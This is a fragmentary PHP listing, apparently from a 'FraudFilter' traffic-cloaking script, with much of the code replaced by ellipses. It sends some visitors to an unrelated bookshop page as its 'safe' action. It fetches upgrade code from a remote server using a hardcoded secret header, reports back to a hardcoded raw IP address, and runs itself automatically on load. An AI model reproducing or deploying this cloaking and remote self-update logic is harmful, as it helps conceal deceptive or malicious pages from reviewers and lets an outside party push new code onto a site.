...
class FraudFilterDetector_ctrjo {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'cd38dbe7-9f27-4ea5-af3b-367d4b1aeb9a.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.lehmanns.de/shop/wirtschaft/5547631-9780754632788-the-british-book-trade-and-spanish-american-independence');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: cd38dbe7-9f27-4ea5-af3b-367d4b1aeb9a',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: cd38dbe7-9f27-4ea5-af3b-367d4b1aeb9a';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: cd38dbe7-9f27-4ea5-af3b-367d4b1aeb9a';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ctrjo&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_ctrjo = new FraudFilterDetector_ctrjo();
$fraudFilterDetector_ctrjo->check();
